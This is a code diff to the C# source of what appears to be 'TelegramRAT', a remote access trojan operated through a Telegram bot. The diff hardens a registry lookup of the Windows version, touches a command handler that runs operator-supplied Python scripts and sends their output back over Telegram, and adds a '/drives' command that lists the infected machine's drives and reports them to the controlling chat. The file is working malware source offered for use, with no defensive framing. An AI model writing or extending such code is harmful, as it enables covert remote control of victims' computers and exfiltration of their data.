@@ -148,12 +148,19 @@ namespace TelegramRAT
 
         static string GetWindowsVersion()
         {
-            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
-            if (key != null)
+            try
             {
-                string prodName = key.GetValue("ProductName") as string;
-                string csdVer = key.GetValue("CSDVersion") as string;
-                return prodName + csdVer;
+                RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
+                if (key != null)
+                {
+                    string prodName = key.GetValue("ProductName") as string;
+                    string csdVer = key.GetValue("CSDVersion") as string;
+                    return prodName + csdVer;
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
             }
             return string.Empty;
         }
@@ -1545,7 +1552,7 @@ namespace TelegramRAT
 
                                 pythonEngine.Execute(model.RawArgs, pythonScope);
                                 pyStream.Position = 0;
-                                
+
                                 if (pyStream.Length > 0)
                                 {
                                     string output = string.Join(string.Empty, new StreamReader(pyStream).ReadToEnd().Take(4096).ToArray());
@@ -1579,7 +1586,7 @@ namespace TelegramRAT
                                 outputStream.Position = 0;
 
                                 string outputText = string.Join(string.Empty, new StreamReader(outputStream).ReadToEnd().Take(4096));
-                                
+
 
                                 if (outputText.Length > 0)
                                     Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed! Output: {outputText}", replyToMessageId: update.Message.MessageId);
@@ -1653,6 +1660,40 @@ namespace TelegramRAT
                         {
                             ReportError(update, ex);
                         }
+                    });
+                }
+            });
+
+            //GET LOGICAL DRIVES
+            CommandsList.Add(new BotCommand
+            {
+                Command = "/drives",
+                CountArgs = 0,
+                Description = "Show all logical drives on this computer.",
+                Example = "/drives",
+                Execute = (model, update) =>
+                {
+                    Task.Run(() =>
+                    {
+                        try
+                        {
+                            DriveInfo[] drives = DriveInfo.GetDrives();
+                            StringBuilder drivesStr = new StringBuilder();
+                            foreach (DriveInfo drive in drives)
+                            {
+                                drivesStr.Append(
+                                $"Name: {drive.Name}\n" +
+                                $"Label: {drive.VolumeLabel}\n" +
+                                $"Type: {drive.DriveType}\n" +
+                                $"Format: {drive.DriveFormat}\n\n");
+                            }                            
+                            Bot.SendTextMessageAsync(update.Message.Chat.Id, string.Join(string.Empty, drivesStr.ToString().Take(4096).ToArray()), ParseMode.Html, replyToMessageId: update.Message.MessageId);
+                        }
+                        catch (Exception ex)
+                        {
+                            ReportError(update, ex);
+                        }
+
                     });
                 }
             });
